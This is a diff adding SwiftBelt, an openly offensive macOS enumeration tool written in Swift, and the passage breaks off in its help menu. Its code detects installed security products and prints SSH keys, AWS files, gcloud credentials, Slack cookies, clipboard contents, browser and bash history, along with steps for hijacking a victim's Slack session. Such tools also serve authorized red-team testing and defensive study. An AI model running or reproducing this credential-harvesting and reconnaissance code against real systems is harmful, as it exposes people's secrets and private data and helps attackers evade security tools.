@@ -1,0 +1,965 @@
+import Cocoa
+import Foundation
+import OSAKit
+import Darwin
+import OpenDirectory
+import SQLite3
+
+let binname = CommandLine.arguments[0]
+let fileMan = FileManager.default
+var isDir = ObjCBool(true)
+
+let black = "\u{001B}[0;30m"
+let red = "\u{001B}[0;31m"
+let green = "\u{001B}[0;32m"
+let yellow = "\u{001B}[0;33m"
+let blue = "\u{001B}[0;34m"
+let magenta = "\u{001B}[0;35m"
+let cyan = "\u{001B}[0;36m"
+let white = "\u{001B}[0;37m"
+let colorend = "\u{001B}[0;0m"
+var hiddenString = ""
+var nm1 = ""
+var nm2 = ""
+
+func Banner(){
+    print("\(cyan)++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\(colorend)")
+    print("\(yellow) _______  _     _  ___   _______  _______  _______  _______  ___      _______")
+    print("|       || | _ | ||   | |       ||       ||  _    ||       ||   |    |       |")
+    print("|  _____|| || || ||   | |    ___||_     _|| |_|   ||    ___||   |    |_     _|")
+    print("| |_____ |       ||   | |   |___   |   |  |       ||   |___ |   |      |   |")
+    print("|_____  ||       ||   | |    ___|  |   |  |  _   | |    ___||   |___   |   |")
+    print(" _____| ||   _   ||   | |   |      |   |  | |_|   ||   |___ |       |  |   |")
+    print("|_______||__| |__||___| |___|      |___|  |_______||_______||_______|  |___|\(colorend)")
+    print("")
+    print("SwiftBelt: A MacOS enumerator similar to @harmjoy's Seatbelt. Does not use any command line utilities")
+    print("author: @cedowens")
+    print("\(cyan)++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\(colorend)")
+    print("")
+}
+
+func SecCheck(){
+    
+    print("\(yellow)##########################################\(colorend)")
+    print("==> Security Tools Found:")
+    do {
+        let myWorkspace = NSWorkspace.shared
+        let processes = myWorkspace.runningApplications
+        var procList = [String]()
+        for i in processes {
+            let str1 = "\(i)"
+            procList.append(str1)
+        }
+        let processes2 = procList.joined(separator: ", ")
+        var b = 0
+        
+        if processes2.contains("CbOsxSensorService") || fileMan.fileExists(atPath: "/Applications/CarbonBlack/CbOsxSensorService"){
+            print("\(green)[+] Carbon Black OSX Sensor installed.\(colorend)")
+            b = 1
+        }
+        if processes2.contains("CbDefense") || fileMan.fileExists(atPath: "/Appllications/Confer.app",isDirectory: &isDir){
+            print("\(green)[+] Carbon Black OSX Sensor installed\(colorend)")
+            b = 1
+        }
+        if processes2.contains("ESET") || processes2.contains("eset") || fileMan.fileExists(atPath: "Library/Application Support/com.eset.remoteadministrator.agent",isDirectory: &isDir){
+            print("\(green)[+] ESET A/V installed\(colorend)")
+            b = 1
+        }
+        if processes2.contains("Littlesnitch") || processes2.contains("Snitch") || fileMan.fileExists(atPath: "/Library/Little Snitch/", isDirectory: &isDir) {
+            print("\(green)[+] Little snitch firewall found\(colorend)")
+            b = 1
+        }
+        
+        if processes2.contains("xagt") || fileMan.fileExists(atPath: "/Library/FireEye/xagt",isDirectory: &isDir) {
+            print("\(green)[+] FireEye HX agent installed\(colorend)")
+            b = 1
+        }
+        if processes2.contains("falconctl") || fileMan.fileExists(atPath: "/Library/CS/falcond") {
+            print("\(green)[+] Crowdstrike Falcon agent found\(colorend)")
+            b = 1
+        }
+        if processes2.contains("OpenDNS") || processes2.contains("opendns") || fileMan.fileExists(atPath: "/Library/Application Support/OpenDNS Roaming Client/dns-updater") {
+            print("\(green)[+] OpenDNS Client running\(colorend)")
+            b = 1
+        }
+        if processes2.contains("SentinelOne") || processes2.contains("sentinelone"){
+            print("\(green)[+] SentinelOne agent running\(colorend)")
+            b = 1
+        }
+        if processes2.contains("GlobalProtect") || processes2.contains("/PanGPS") || fileMan.fileExists(atPath: "/Library/Logs/PaloAltoNetworks/GlobalProtect",isDirectory: &isDir) || fileMan.fileExists(atPath: "/Library/PaloAltoNetworks",isDirectory: &isDir){
+            print("\(green)[+] Global Protect PAN PVN client running\(colorend)")
+            b = 1
+        }
+        if processes2.contains("HostChecker") || processes2.contains("pulsesecure") || fileMan.fileExists(atPath: "/Applications/Pulse Secure.app",isDirectory: &isDir) || processes2.contains("Pulse-Secure"){
+            print("\(green)[+] Pulse VPN client running\(colorend)")
+            b = 1
+        }
+        if processes2.contains("AMP-for-Endpoints") || fileMan.fileExists(atPath: "/opt/cisco/amp",isDirectory: &isDir){
+            print("\(green)[+] Cisco AMP for endpoints found\(colorend)")
+            b = 1
+        }
+        if fileMan.fileExists(atPath: "/usr/local/bin/jamf") || fileMan.fileExists(atPath: "/usr/local/jamf"){
+            print("\(green)[+] JAMF found on this host\(colorend)")
+            b = 1
+        }
+        if fileMan.fileExists(atPath: "/Library/Application Support/Malwarebytes",isDirectory: &isDir){
+            print("\(green)[+] Malwarebytes A/V found on this host\(colorend)")
+            b = 1
+        }
+        if fileMan.fileExists(atPath: "/usr/local/bin/osqueryi"){
+            print("\(green)[+] osqueryi found\(colorend)")
+            b = 1
+        }
+        if fileMan.fileExists(atPath: "/Library/Sophos Anti-Virus/",isDirectory: &isDir){
+            print("\(green)[+] Sophos antivirus found\(colorend)")
+            b = 1
+        }
+        
+        if b == 0{
+            print("[-] No security products found.")
+        }
+        
+    } catch {
+        print("\(red)[-] Error listing running applications\(colorend)")
+    }
+    
+    print("\(yellow)##########################################\(colorend)")
+    
+}
+
+func getaddy() -> [String]{
+    //getaddy function code lifted from https://stackoverflow.com/questions/25626117/how-to-get-ip-addresses-in-swift/25627545
+    var addresses = [String]()
+    
+    var ifaddr : UnsafeMutablePointer<ifaddrs>?
+    guard getifaddrs(&ifaddr) == 0 else { return [] }
+    guard let firstAddr = ifaddr else { return [] }
+    
+    for ptr in sequence(first: firstAddr, next: { $0.pointee.ifa_next}) {
+        let flags = Int32(ptr.pointee.ifa_flags)
+        let addr = ptr.pointee.ifa_addr.pointee
+        
+        if (flags & (IFF_UP|IFF_RUNNING|IFF_LOOPBACK)) == (IFF_UP|IFF_RUNNING) {
+            if addr.sa_family == UInt8(AF_INET) || addr.sa_family == UInt8(AF_INET6) {
+                var hostname = [CChar](repeating: 0, count: Int(NI_MAXHOST))
+                if (getnameinfo(ptr.pointee.ifa_addr, socklen_t(addr.sa_len), &hostname, socklen_t(hostname.count),nil, socklen_t(0), NI_NUMERICHOST) == 0) {
+                    let address = String(cString: hostname)
+                    addresses.append(address)
+                }
+            }
+        }
+    }
+    freeifaddrs(ifaddr)
+    return addresses
+}
+
+func SystemInfo(){
+    let myScript = "return (system info)"
+    let k = OSAScript.init(source: myScript)
+    var compileErr : NSDictionary?
+    k.compileAndReturnError(&compileErr)
+    var scriptErr : NSDictionary?
+    let myresult = k.executeAndReturnError(&scriptErr)!
+    print("\(yellow)##########################################\(colorend)")
+    print("==> System Info:\(green)")
+    
+    print(myresult)
+    let mySess = ODSession.default()
+    do {
+        let x = try mySess!.nodeNames()
+        var y = [String]()
+        for each in x{
+            y.append("\(each)")
+        }
+        var c = 0
+        for item in y{
+            if item.contains("AD") || item.contains("Active Directory"){
+                print("\(green)[+] Host is likely joined to AD\(colorend)")
+                c = 1
+            }
+        }
+        
+        if c == 0{
+            if fileMan.fileExists(atPath: "/Applications/NoMAD.app",isDirectory: &isDir){
+                print("\(green)\n[+] NoMAD found so host is likely joined to AD\(colorend)")
+            }
+            else {
+                print("\(red)[-] No direct AD binding found on this host\(colorend)")
+            }
+        }
+        print("")
+        print("\(green)Open Directory Nodes Found On This Host:\(colorend)")
+        for d in x{
+            print(d)
+        }
+        //print( try mySess!.nodeNames())
+    } catch {
+        print("\(red)[-] Error checking Open Directory Nodes.\(colorend)")
+    }
+    print("")
+    print("\(green)Wifi SSIDs found:\(colorend)")
+    var plistFormat = PropertyListSerialization.PropertyListFormat.xml
+    var pListData : [String: AnyObject] = [:]
+    let pListPath : String? = Bundle.main.path(forResource: "data", ofType: "plist")
+    
+    
+    if fileMan.fileExists(atPath: "/Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist"){
+        let plistURL = URL(fileURLWithPath: "/Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist")
+        do {
+            let plistXML = try Data(contentsOf: plistURL)
+            pListData = try PropertyListSerialization.propertyList(from:plistXML, options: .mutableContainersAndLeaves, format: &plistFormat) as! [String:AnyObject]
+            
+            for each in pListData{
+                if each.key == "KnownNetworks"{
+                    print("\(each.value)")
+                        
+                    }
+            
+                }
+            
+            } catch {
+                print("\(red)[-] Error reading the com.appleairport.preferences.plist file\(colorend)")
+            }
+            
+        }
+    
+    let internalAddys = getaddy()
+    //let internalAddys2 = internalAddys.joined(separator: ", ")
+    print("")
+    print("Internal IP Addresses:\(green)")
+    for ip in internalAddys{
+        print(ip)
+    }
+    //print(internalAddys2)
+    
+    print("")
+    print("\(colorend)Environment variable info:\(green)")
+    let v = ProcessInfo.processInfo.environment
+    for x in v{
+        print(x)
+    }
+    
+    print("")
+    print("\(colorend)SSH/AWS/gcloud Credentials Search:\(green)")
+    let uName = NSUserName()
+    if fileMan.fileExists(atPath: "/Users/\(uName)/.ssh",isDirectory: &isDir){
+        print("\(colorend)==>SSH Key Info Found:\(green)")
+        let enumerator = fileMan.enumerator(atPath: "/Users/\(uName)/.ssh")
+        while let each = enumerator?.nextObject() as? String {
+            do {
+                print("\(colorend)\(each):\(green)")
+                let fileData = "/Users/\(uName)/.ssh/\(each)"
+                let fileData2 = try String(contentsOfFile: fileData)
+                if fileData2 != nil {
+                    print(fileData2)
+                }
+                
+            } catch {
+                print("\(red)[-] Error attempting to get file contents for /Users/\(uName)/.ssh/\(each)\(colorend)\n")
+            }
+        
+        }
+        
+    } else {
+        print("\(red)[-] ~/.ssh directory not found on this host\(colorend)")
+    }
+    
+    print("")
+    
+    if fileMan.fileExists(atPath: "/Users/\(uName)/.aws",isDirectory: &isDir){
+        print("\(colorend)==>AWS Info Found:\(green)")
+        let enumerator = fileMan.enumerator(atPath: "/Users/\(uName)/.aws")
+        while let each = enumerator?.nextObject() as? String {
+            do {
+                print("\(colorend)\(each):\(green)")
+                let fileData = "/Users/\(uName)/.aws/\(each)"
+                let fileData2 = try String(contentsOfFile: fileData)
+                if fileData2 != nil {
+                    print(fileData2)
+                }
+                
+            } catch {
+                print("\(red)[-] Error attempting to get file contents for /Users/\(uName)/.aws/\(each)\(colorend)\n")
+            }
+        }
+    } else {
+        print("\(red)[-] ~/.aws directory not found on this host\(colorend)")
+    }
+    
+    print("")
+    
+    if fileMan.fileExists(atPath: "/Users/\(uName)/.config/gcloud/credentials.db"){
+        do {
+            print("\(colorend)==>GCP gcloud Info Found:\(green)")
+            var db : OpaquePointer?
+            var dbURL = URL(fileURLWithPath: "/Users/\(uName)/.config/gcloud/credentials.db")
+            if sqlite3_open(dbURL.path, &db) != SQLITE_OK{
+                print("\(red)[-] Could not open the gcloud credentials database\(colorend)")
+            } else {
+                let queryString = "select * from credentials;"
+                var queryStatement: OpaquePointer? = nil
+                if sqlite3_prepare_v2(db, queryString, -1, &queryStatement, nil) == SQLITE_OK{
+                    while sqlite3_step(queryStatement) == SQLITE_ROW{
+                        let col1 = sqlite3_column_text(queryStatement, 0)
+                        if col1 != nil{
+                            nm1 = String(cString: col1!)
+                        }
+                        let col2 = sqlite3_column_text(queryStatement, 1)
+                        if col2 != nil{
+                            nm2 = String(cString: col2!)
+                        }
+                        print("account_id: \(nm1)  |  value: \(nm2)")
+                    }
+                    sqlite3_finalize(queryStatement)
+                }
+            }
+            
+        }
+        catch {
+            print("\(red)[-] Error attempting to get contents of ~/.config/gcloud/credentials.db\(colorend)")
+        }
+        
+    } else {
+        print("\(red)[-] ~/.config/gcloud/credentials.db not found on this host\(colorend)")
+    }
+    
+    
+    print("\(colorend)\(yellow)##########################################\(colorend)")
+        
+    }
+    
+    
+    
+//}
+
+func Clipboard(){
+    let clipBoard = NSPasteboard.general
+    var clipArray = [String]()
+    
+    for each in clipBoard.pasteboardItems! {
+        if let str = each.string(forType: NSPasteboard.PasteboardType(rawValue: "public.utf8-plain-text")){
+            clipArray.append(str)
+        }
+    }
+    
+    let joined = clipArray.joined(separator: ", ")
+    
+    print("\(yellow)##########################################\(colorend)")
+    print("==> Clipboard Info:\(green)")
+    print(joined)
+//    print(myresult2)
+    print("\(colorend)\(yellow)##########################################\(colorend)\(colorend)")
+    
+}
+
+func RunningApps(){
+    let myWorkSpace = NSWorkspace.shared
+    let appCount = myWorkSpace.runningApplications.count
+    
+    print("\(yellow)##########################################\(colorend)")
+    print("==>Count of Running Apps: \(appCount)")
+
+    var count = 0
+    for each in NSWorkspace.shared.runningApplications {
+        count = count + 1
+        let appName = each.localizedName!
+        let appURL = each.bundleURL//!
+        let launchDate = each.launchDate
+        let pid = each.processIdentifier
+        
+        if each.isHidden == true {
+            hiddenString = "Hidden: YES\r"
+        }
+        else {
+            hiddenString = "Hidden: NO\r"
+        }
+        print("\(count). Name: \(appName)")
+        
+        if appURL != nil {
+            print("===>\(green)Path: \(appURL)\(colorend)")
+        }
+        
+        if launchDate != nil {
+            var lString = "\(launchDate)"
+            var lString2 = lString.replacingOccurrences(of: "Optional", with: "").replacingOccurrences(of: "(", with: "").replacingOccurrences(of: ")", with: "")
+            print("===>\(green)Launch Date: \(lString2)\(colorend)")
+                
+        }
+        
+        
+        if pid != nil {
+            var pString = "\(pid)"
+            var pString2 = pString.replacingOccurrences(of: "Optional", with: "").replacingOccurrences(of: "(", with: "").replacingOccurrences(of: ")", with: "")
+            print("===>\(green)PID: \(pString2)\(colorend)")
+            
+        }
+
+        print("\(hiddenString)")
+}
+    print("\(yellow)##########################################\(colorend)")
+}
+
+func ListUsers(){
+    let userDir = "/Users/"
+    do {
+        print("\(yellow)##########################################\(colorend)")
+        print("==>Local User Account Info:\(green)")
+        let users = try fileMan.contentsOfDirectory(atPath: userDir)
+        for user in users{
+            print(user)
+        }
+        print("\(colorend)\(yellow)##########################################\(colorend)")
+    } catch {
+        print("\(yellow)##########################################\(colorend)")
+        print("\(red)[-] Error attempting to list users\(colorend)")
+        print("\(yellow)##########################################\(colorend)")
+    }
+    
+    
+    
+}
+
+func LaunchAgents(){
+    print("\(yellow)##########################################\(colorend)")
+    print("==>LaunchAgent/LaunchDaemon Info:")
+    let uName = NSUserName()
+    
+    if fileMan.fileExists(atPath: "/Users/\(uName)/Library/LaunchAgents",isDirectory: &isDir){
+        let launchaURL = URL(fileURLWithPath: "/Users/\(uName)/Library/LaunchAgents")
+        print("\(colorend)User LaunchAgent Info:\(green)")
+        do {
+            let fileURLs = try fileMan.contentsOfDirectory(at: launchaURL, includingPropertiesForKeys: nil)
+            for file in fileURLs{
+                print(file)
+            }
+        } catch {
+            print("\(colorend)\(red)[-] Error while listing user LaunchAgent files\(colorend)")
+            
+        }
+        
+        print("")
+        
+    }
+    
+    if fileMan.fileExists(atPath: "/Library/LaunchDaemons",isDirectory: &isDir){
+        let launchdURL = URL(fileURLWithPath: "/Library/LaunchDaemons")
+        print("\(colorend)System LaunchDaemon Info:\(green)")
+        do {
+            let fileURLs = try fileMan.contentsOfDirectory(at: launchdURL, includingPropertiesForKeys: nil)
+            for file in fileURLs{
+                
+                print(file)
+            }
+        } catch {
+            print("\(colorend)\(red)[-] Error while listing System LaunchDaemon files\(colorend)")
+        }
+        
+        print("")
+        
+    }
+    
+    if fileMan.fileExists(atPath: "/Library/LaunchAgents",isDirectory: &isDir){
+        let launchaURL2 = URL(fileURLWithPath: "/Library/LaunchAgents")
+        print("\(colorend)System LaunchAgent Info:\(green)")
+        do {
+            let fileURLs = try fileMan.contentsOfDirectory(at: launchaURL2, includingPropertiesForKeys: nil)
+            for file in fileURLs{
+                
+                print(file)
+            }
+        } catch {
+            print("\(colorend)\(red)[-] Error while listing System LaunchAgent files\(colorend)")
+        }
+        
+        print("")
+        
+    }
+    
+    if fileMan.fileExists(atPath: "/Library/Managed Preferences",isDirectory: &isDir){
+        let launchaURL4 = URL(fileURLWithPath: "/Library/Managed Preferences/")
+        print("\(colorend)Configuration Profile Info:\(green)")
+        do {
+            let fileURLs = try fileMan.contentsOfDirectory(at: launchaURL4, includingPropertiesForKeys: nil)
+            for file in fileURLs{
+                
+                print(file)
+            }
+        } catch {
+            print("\(colorend)\(red)[-] Error while listing Configuration Profile files\(colorend)")
+        }
+
+        
+    }
+    
+    let script = ##"tell application "System Events" to get the path of every login item"##
+    let p = OSAScript.init(source: script)
+    var compileErr : NSDictionary?
+    p.compileAndReturnError(&compileErr)
+    var scriptErr : NSDictionary?
+    let myresult = p.executeAndReturnError(&scriptErr)!
+    print("")
+    print("\(colorend)==> Login Item Info:\(green)")
+    if myresult != nil {
+        print(myresult)
+    } else {
+        print("\(red)[-] No Login Items found on this host.")
+    }
+    
+    print("\(yellow)##########################################\(colorend)")
+    
+    
+    
+    print("\(colorend)\(yellow)##########################################\(colorend)")
+}
+
+func BrowserHistory(){
+    print("\(colorend)\(yellow)##########################################\(colorend)")
+    print("==>Browser History Info:")
+    let fileMan = FileManager()
+    var nm1 = ""
+    var nm2 = ""
+    var nm3 = ""
+    var nm4 = ""
+    var visitDate = ""
+    var histURL = ""
+    var cVisitDate = ""
+    var cUrl = ""
+    var cTitle = ""
+    var ffoxDate = ""
+    var ffoxURL = ""
+
+    var isDir = ObjCBool(true)
+    let username = NSUserName()
+
+    //quarantine history
+    if fileMan.fileExists(atPath: "/Users/\(username)/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2", isDirectory: &isDir){
+        print("")
+        print("\(green)***************Quarantine History Results for user \(username)***************\(colorend)")
+                    var db : OpaquePointer?
+                    var dbURL = URL(fileURLWithPath: "/Users/\(username)/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2")
+                    if sqlite3_open(dbURL.path, &db) != SQLITE_OK{
+                        print("\(red)[-] Could not open quarantive events database.\(colorend)")
+                    }else {
+                        
+                        let queryString = "select datetime(LSQuarantineTimeStamp, 'unixepoch') as last_visited, LSQuarantineAgentBundleIdentifier, LSQuarantineDataURLString, LSQuarantineOriginURLString from LSQuarantineEvent where LSQuarantineDataURLString is not null order by last_visited;"
+
+                        var queryStatement: OpaquePointer? = nil
+                        
+                        if sqlite3_prepare_v2(db, queryString, -1, &queryStatement, nil) == SQLITE_OK{
+                            while sqlite3_step(queryStatement) == SQLITE_ROW {
+                                let col1 = sqlite3_column_text(queryStatement, 0)
+                                if col1 != nil{
+                                    nm1 = String(cString: col1!)
+                                    
+                                }
+
+                                let col2 = sqlite3_column_text(queryStatement, 1)
+                                if col2 != nil{
+                                    nm2 = String(cString: col2!)
+                                }
+                                
+                                let col3 = sqlite3_column_text(queryStatement, 2)
+                                if col3 != nil{
+                                    nm3 = String(cString:col3!)
+                                }
+                                
+                                
+                                let col4 = sqlite3_column_text(queryStatement, 3)
+                                if col4 != nil{
+                                    nm4 = String(cString: col4!)
+                                }
+                                
+                                
+                                print("Date: \(nm1) | App: \(nm2) | File: \(nm3) | OriginURL: \(nm4)")
+
+                            }
+        //
+                            sqlite3_finalize(queryStatement)
+                            
+                        }
+                        
+                        
+                        
+                    }
+        
+    }else {
+        print("\(red)[-] QuarantineEventsV2 database not found for user \(username)\(colorend)")
+    }
+
+    //safari history check
+    if fileMan.fileExists(atPath: "/Users/\(username)/Library/Safari/History.db", isDirectory: &isDir){
+        print("")
+        print("\(green)***************Safari history results for user \(username)***************\(colorend)")
+        var db : OpaquePointer?
+        var dbURL = URL(fileURLWithPath: "/Users/\(username)/Library/Safari/History.db")
+        if sqlite3_open(dbURL.path, &db) != SQLITE_OK{
+            print("\(red)[-] Could not open the Safari History.db file for user \(username)\(colorend)")
+        }else {
+            //let queryString = "select history_visits.visit_time, history_items.url from history_visits, history_items where history_visits.history_item=history_items.id;"
+            let queryString = "select datetime(history_visits.visit_time + 978307200, 'unixepoch') as last_visited, history_items.url from history_visits, history_items where history_visits.history_item=history_items.id order by last_visited;"
+            var queryStatement: OpaquePointer? = nil
+            
+            if sqlite3_prepare_v2(db, queryString, -1, &queryStatement, nil) == SQLITE_OK{
+                while sqlite3_step(queryStatement) == SQLITE_ROW{
+                    let col1 = sqlite3_column_text(queryStatement, 0)
+                    if col1 != nil{
+                        visitDate = String(cString: col1!)
+                        
+                    }
+                    let col2 = sqlite3_column_text(queryStatement, 1)
+                    if col2 != nil{
+                        histURL = String(cString: col2!)
+                        
+                    }
+                    
+                    print("Date: \(visitDate) | URL: \(histURL)")
+                    
+                }
+                sqlite3_finalize(queryStatement)
+                
+            }
+            
+        }
+    }
+    else {
+        print("\(red)[-] Safari History.db database not found for user \(username)\(colorend)")
+    }
+
+    //chrome history check
+    if fileMan.fileExists(atPath: "/Users/\(username)/Library/Application Support/Google/Chrome/Default/History", isDirectory: &isDir){
+        print("")
+        print("\(green)***************Chrome history results for user \(username)***************\(colorend)")
+        var db : OpaquePointer?
+        var dbURL = URL(fileURLWithPath: "/Users/\(username)/Library/Application Support/Google/Chrome/Default/History")
+        
+        if sqlite3_open(dbURL.path, &db) != SQLITE_OK{
+            print("\(red)[-] Could not open the Chrome history database file for user \(username)\(colorend)")
+            
+        } else{
+            
+            let queryString = "select datetime(last_visit_time/1000000-11644473600, \"unixepoch\") as last_visited, url, title from urls order by last_visited;"
+            
+            var queryStatement: OpaquePointer? = nil
+            
+            if sqlite3_prepare_v2(db, queryString, -1, &queryStatement, nil) == SQLITE_OK{
+                
+                while sqlite3_step(queryStatement) == SQLITE_ROW{
+                    
+                    
+                    let col1 = sqlite3_column_text(queryStatement, 0)
+                    if col1 != nil{
+                        cVisitDate = String(cString: col1!)
+                        
+                    }
+                    
+                    let col2 = sqlite3_column_text(queryStatement, 1)
+                    if col2 != nil{
+                        cUrl = String(cString: col2!)
+                        
+                    }
+                    
+                    let col3 = sqlite3_column_text(queryStatement, 2)
+                    if col3 != nil{
+                        cTitle = String(cString: col3!)
+                        
+                    }
+                    
+                    
+                     print("Date: \(cVisitDate) | URL: \(cUrl) | Title: \(cTitle)")
+                    
+                }
+                
+                sqlite3_finalize(queryStatement)
+                
+            }
+            else {
+                print("\(red)[-] Issue with preparing the Chrome History database...this may be because something is currently writing to it (i.e., an active Chrome browser)...kill the browser and try again\(colorend)")
+            }
+            
+        }
+    }
+    else{
+        print("\(red)[-] Chrome History database not found for user \(username)\(colorend)")
+    }
+        
+    //firefox history check
+    if fileMan.fileExists(atPath: "/Users/\(username)/Library/Application Support/Firefox/Profiles/"){
+        let fileEnum = fileMan.enumerator(atPath: "/Users/\(username)/Library/Application Support/Firefox/Profiles/")
+        print("")
+        print("\(green)***************Firefox history results for user \(username)***************\(colorend)")
+        
+        while let each = fileEnum?.nextObject() as? String {
+            if each.contains("places.sqlite"){
+                let placesDBPath = "/Users/\(username)/Library/Application Support/Firefox/Profiles/\(each)"
+                var db : OpaquePointer?
+                var dbURL = URL(fileURLWithPath: placesDBPath)
+                
+                var printTest = sqlite3_open(dbURL.path, &db)
+                
+                if sqlite3_open(dbURL.path, &db) != SQLITE_OK{
+                    print("\(red)[-] Could not open the Firefox history database file for user \(username)\(colorend)")
+                } else {
+                    
+                    let queryString = "select datetime(visit_date/1000000,'unixepoch') as time, url FROM moz_places, moz_historyvisits where moz_places.id=moz_historyvisits.place_id order by time;"
+                    
+                    var queryStatement: OpaquePointer? = nil
+                    
+                    if sqlite3_prepare_v2(db, queryString, -1, &queryStatement, nil) == SQLITE_OK{
+                        
+                        while sqlite3_step(queryStatement) == SQLITE_ROW{
+                            let col1 = sqlite3_column_text(queryStatement, 0)
+                            if col1 != nil{
+                                ffoxDate = String(cString: col1!)
+                            }
+                            
+                            let col2 = sqlite3_column_text(queryStatement, 1)
+                            if col2 != nil{
+                                ffoxURL = String(cString: col2!)
+                            }
+                                                                
+                             print("Date: \(ffoxDate) | URL: \(ffoxURL)")
+                            
+                        }
+                        
+                        sqlite3_finalize(queryStatement)
+                       
+                    }
+                    
+                    
+                }
+            }
+        }
+    }
+    else {
+        print("\(red)[-] Firefox places.sqlite database not found for user \(username)\(colorend)".data(using: .utf8)!)
+    }
+    
+    print("\(colorend)\(yellow)##########################################\(colorend)")
+}
+
+func SlackExtract(){
+    var fileMan = FileManager.default
+    var uName = NSUserName()
+    var nm1 = ""
+    var nm2 = ""
+    var nm3 = ""
+    var nm4 = ""
+    
+    print("\(colorend)\(yellow)##########################################\(colorend)")
+
+    print("==> Slack Info:")
+
+    if fileMan.fileExists(atPath: "/Users/\(uName)/Library/Application Support/Slack"){
+        print("\(green)[+] Slack found on this host!\(colorend)")
+        if fileMan.fileExists(atPath: "/Users/\(uName)/Library/Application Support/Slack/storage/slack-downloads"){
+            print("\u{001B}[0;33m-->Found slack-downloads file\u{001B}[0;0m")
+            print("\u{001B}[0;33m---->Downloads content of interest:\u{001B}[0;0m")
+            let dwnURL = URL(fileURLWithPath: "/Users/\(uName)/Library/Application Support/Slack/storage/slack-downloads")
+            do {
+                let dwnData = try String(contentsOf: dwnURL)
+                
+                let dwnDataJoined = dwnData.components(separatedBy: ",")
+                
+                for item in dwnDataJoined{
+                    if item.contains("http") {
+                        print(item)
+                    }
+                    if item.contains("/Users/"){
+                        print("\u{001B}[0;36m==>\u{001B}[0;0m \(item)")
+                    }
+                }
+                
+            } catch {
+                print("\(red)[-] Error getting contents of slack-downloads file")
+            }
+            
+            
+        }
+        
+        if fileMan.fileExists(atPath: "/Users/\(uName)/Library/Application Support/Slack/storage/slack-workspaces"){
+               print("")
+               print("\u{001B}[0;33m-->Found slack-workspaces file\u{001B}[0;0m")
+               print("\u{001B}[0;33m---->Workspaces info of interest:\u{001B}[0;0m")
+               let wkspURL = URL(fileURLWithPath: "/Users/\(uName)/Library/Application Support/Slack/storage/slack-workspaces")
+            do {
+                let wkspData = try String(contentsOf: wkspURL)
+                
+                let wkspJoined = wkspData.components(separatedBy: ",")
+                
+                for each in wkspJoined{
+                    if (each.contains("name") && !(each.contains("_"))){
+                        if let index = (each.range(of: "{")?.upperBound){
+                            let modified = String(each.suffix(from: index))
+                            print(modified)
+                        } else {
+                            print(each)
+                        }
+                        
+                    }
+                    
+                    if each.contains("team_name"){
+                        print("\u{001B}[0;36m==>\u{001B}[0;0m \(each)")
+                    }
+                    
+                    if each.contains("team_url"){
+                        print("\u{001B}[0;36m==>\u{001B}[0;0m \(each)")
+                    }
+                    
+                    if each.contains("unreads"){
+                        print("\u{001B}[0;36m==>\u{001B}[0;0m \(each)")
+                    }
+                }
+            } catch {
+                print("\(red)[-] Error getting slack-teams content\(colorend)")
+            }
+               
+           }
+        
+        
+        if fileMan.fileExists(atPath: "/Users/\(uName)/Library/Application Support/Slack/Cookies"){
+            print("")
+            print("\u{001B}[0;33m-->Found Slack Cookies Database\u{001B}[0;0m")
+            print("\u{001B}[0;33m---->Cookies found:\u{001B}[0;0m")
+            var db : OpaquePointer?
+            var dbURL = URL(fileURLWithPath: "/Users/\(uName)/Library/Application Support/Slack/Cookies")
+            if sqlite3_open(dbURL.path, &db) != SQLITE_OK{
+                print("\(red)[-] Could not open the Slack Cookies database\(colorend)")
+            } else {
+                print("Format: host_key \u{001B}[0;36m||\u{001B}[0;0m name \u{001B}[0;36m||\u{001B}[0;0m value ")
+                let queryString = "select datetime(creation_utc, 'unixepoch') as creation, host_key, name, value from cookies order by creation;"
+                var queryStatement: OpaquePointer? = nil
+                
+                if sqlite3_prepare_v2(db, queryString, -1, &queryStatement, nil) == SQLITE_OK{
+                    while sqlite3_step(queryStatement) == SQLITE_ROW{
+                        let col1 = sqlite3_column_text(queryStatement, 0)
+                        if col1 != nil{
+                            nm1 = String(cString: col1!)
+                        }
+                        
+                        let col2 = sqlite3_column_text(queryStatement, 1)
+                        if col2 != nil{
+                            nm2 = String(cString: col2!)
+                        }
+                        
+                        let col3 = sqlite3_column_text(queryStatement, 2)
+                        if col3 != nil{
+                            nm3 = String(cString: col3!)
+                        }
+                        
+                        let col4 = sqlite3_column_text(queryStatement, 3)
+                        if col4 != nil {
+                            nm4 = String(cString:col4!)
+                        }
+                        
+                        print("\(nm2) \u{001B}[0;36m||\u{001B}[0;0m \(nm3) \u{001B}[0;36m||\u{001B}[0;0m \(nm4)")
+                }
+                    
+            }
+                else {
+                    print("\(red)[-] Cookies database not found\(colorend)")
+                }
+        }
+        
+    }
+        
+        print("\u{001B}[0;36m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\u{001B}[0;0m")
+        print("Steps from Cody's article to load the Slack files found:")
+        print("1. Install a new instance of slack (but don’t sign in to anything)")
+        print("2. Close Slack and replace the automatically created Slack/storage/slack-workspaces and Slack/Cookies files with the two you downloaded from the victim")
+        print("3. Start Slack")
+        print("\u{001B}[0;36m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\u{001B}[0;0m")
+        
+       print("\(colorend)\(yellow)##########################################\(colorend)")
+    }
+}
+
+func BashHistory(){
+    print("\(colorend)\(yellow)##########################################\(colorend)")
+    print("==> Bash History Data:\(green)")
+    var uName = NSUserName()
+    let bashPath = URL(fileURLWithPath: "/Users/\(uName)/.bash_history")
+    do {
+        let bashData = try String(contentsOf: bashPath)
+        print(bashData)
+    } catch {
+        print("\(colorend)\(red)[-] Error reading bash history content for the current user\(colorend)")
+    }
+    
+    print("\(colorend)\(yellow)##########################################\(colorend)")
+}
+
+
+
+Banner()
+
+if CommandLine.arguments.count == 1{
+    SecCheck()
+    SystemInfo()
+    Clipboard()
+    RunningApps()
+    ListUsers()
+    LaunchAgents()
+    BrowserHistory()
+    SlackExtract()
+    BashHistory()
+}
+else {
+    for argument in CommandLine.arguments{
+        if argument.contains("-h"){
+            print("Help menu:")
+            print("\(yellow)SwiftBelt Options:\(colorend)")
+            print("\(cyan)-SecurityTools -->\(colorend) Check for the presence of security tools")
